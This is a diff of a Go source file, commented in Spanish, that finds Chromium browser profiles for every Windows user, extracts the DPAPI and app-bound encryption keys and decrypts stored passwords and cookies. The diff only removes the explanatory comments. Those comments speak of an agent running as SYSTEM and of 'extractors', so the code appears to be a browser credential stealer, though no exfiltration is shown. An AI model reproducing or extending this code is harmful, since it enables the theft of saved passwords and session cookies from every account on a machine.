@@ -15,21 +15,15 @@ import (
 	"strings"
 )
 
-// ChromeProfile describe una carpeta de perfil de un navegador Chromium.
 type ChromeProfile struct {
-	Browser    string // Chrome, Edge, Brave...
-	Name       string // Chrome/Default
-	Dir        string // carpeta del perfil
-	LoginData  string // ...\Login Data (puede no existir)
-	Cookies    string // ...\Network\Cookies (puede no existir)
-	LocalState string // ...\Local State del User Data
+	Browser    string
+	Name       string
+	Dir        string
+	LoginData  string
+	Cookies    string
+	LocalState string
 }
 
-// chromUserDataDirs devuelve las carpetas User Data de los navegadores
-// Chromium que haya en la máquina. Se recorre el LOCALAPPDATA del usuario actual
-// y el de todos los perfiles de C:\Users, porque el agente puede correr como
-// SYSTEM y entonces LOCALAPPDATA apunta al perfil del sistema, donde no hay
-// navegador. Chrome primero; Edge y Brave usan el mismo esquema y salen gratis.
 func chromUserDataDirs() []string {
 	seen := make(map[string]bool, 8)
 	present := make([]string, 0, 8)
@@ -53,8 +47,6 @@ func chromUserDataDirs() []string {
 	return present
 }
 
-// localAppDataDirs devuelve cada %LOCALAPPDATA% que exista: el del usuario que
-// corre el agente y el de cada perfil real bajo C:\Users.
 func localAppDataDirs() []string {
 	dirs := make([]string, 0, 4)
 	seen := make(map[string]bool, 4)
@@ -85,7 +77,6 @@ func localAppDataDirs() []string {
 		if !entry.IsDir() {
 			continue
 		}
-		// Default, Public y las carpetas de servicio no tienen navegador.
 		switch strings.ToLower(entry.Name()) {
 		case "default", "default user", "public", "all users":
 			continue
@@ -95,8 +86,6 @@ func localAppDataDirs() []string {
 	return dirs
 }
 
-// ChromeProfiles enumera los perfiles que tengan Login Data o Cookies. Un
-// perfil con cookies y sin contraseÃ±as guardadas tambiÃ©n interesa.
 func ChromeProfiles() []ChromeProfile {
 	profiles := make([]ChromeProfile, 0, 8)
 	for _, userData := range chromUserDataDirs() {
@@ -145,8 +134,6 @@ type localStateFile struct {
 	} `json:"os_crypt"`
 }
 
-// ChromeScan devuelve una lÃ­nea por cada perfil que existe en disco, tenga o
-// no Login Data. Sirve para diagnosticar por quÃ© la extracciÃ³n sale vacÃ­a.
 func ChromeScan() []string {
 	out := make([]string, 0, 8)
 	for _, userData := range chromUserDataDirs() {
@@ -186,22 +173,12 @@ func ChromeScan() []string {
 	return out
 }
 
-// ChromeKeys son las dos claves que puede necesitar un valor cifrado:
-// User para v10/v11 y AppBound para v20 (Chrome 127+).
 type ChromeKeys struct {
 	User        []byte
 	AppBound    []byte
 	AppBoundErr error
 }
 
-// ChromeKeysFromLocalState saca las claves del Local State.
-//
-// encrypted_key viene envuelta en DPAPI del usuario. app_bound_encrypted_key
-// viene envuelta dos veces: DPAPI de mÃ¡quina por fuera y DPAPI de usuario por
-// dentro, asÃ­ que necesita un token SYSTEM para abrirse (ver
-// DPAPIUnprotectMachine). Si una de las dos falla, la otra sigue sirviendo:
-// los valores viejos se descifran con la clave de usuario y los nuevos con la
-// app-bound.
 func ChromeKeysFromLocalState(localStatePath string) (ChromeKeys, error) {
 	var keys ChromeKeys
 
@@ -285,8 +262,6 @@ func appBoundKeyFromBase64(encoded string) ([]byte, error) {
 	return key, nil
 }
 
-// ChromeMasterKey devuelve la clave de usuario. Se mantiene para los
-// llamadores que solo descifran valores v10/v11.
 func ChromeMasterKey(localStatePath string) ([]byte, error) {
 	keys, err := ChromeKeysFromLocalState(localStatePath)
 	if keys.User != nil {
@@ -298,11 +273,6 @@ func ChromeMasterKey(localStatePath string) ([]byte, error) {
 	return nil, errors.New("chrome: sin clave de usuario")
 }
 
-// DecryptChromeValue descifra un valor con una clave concreta.
-//
-//	v10/v11: AES-256-GCM, nonce en [3:15], tag en los Ãºltimos 16 bytes.
-//	v20:     mismo esquema con la clave app-bound.
-//	sin prefijo: blob DPAPI heredado.
 func DecryptChromeValue(blob, key []byte) (string, error) {
 	if len(blob) == 0 {
 		return "", errors.New("chrome: valor vacÃ­o")
@@ -325,9 +295,6 @@ func DecryptChromeValue(blob, key []byte) (string, error) {
 	}
 }
 
-// DecryptChromeValueWith elige la clave segÃºn el prefijo del blob. Es la
-// funciÃ³n que deben usar los extractores: un mismo perfil mezcla valores v10
-// viejos con v20 nuevos.
 func DecryptChromeValueWith(blob []byte, keys ChromeKeys) (string, error) {
 	if len(blob) == 0 {
 		return "", errors.New("chrome: valor vacÃ­o")
@@ -358,9 +325,6 @@ func DecryptChromeValueWith(blob []byte, keys ChromeKeys) (string, error) {
 	}
 }
 
-// decryptAppBound abre un valor v20 y quita el hash de dominio de 32 bytes que
-// Chrome antepone al secreto. Sin ese recorte la contraseÃ±a sale con 32 bytes
-// binarios delante.
 func decryptAppBound(blob, key []byte) (string, error) {
 	raw, err := decryptGCMRaw(blob, key)
 	if err != nil {
@@ -380,9 +344,6 @@ func decryptGCM(blob, key []byte) (string, error) {
 	return strings.TrimRight(string(raw), "\x00"), nil
 }
 
-// EncryptChromeValue cifra un valor con el formato v10 que escribe Chrome:
-// prefijo "v10", nonce de 12 bytes, texto cifrado y etiqueta GCM. Se usa para
-// generar fixtures que el propio lector pueda abrir.
 func EncryptChromeValue(plain string, key []byte) ([]byte, error) {
 	if len(key) != 32 {
 		return nil, errors.New("chrome: clave AES invÃ¡lida")
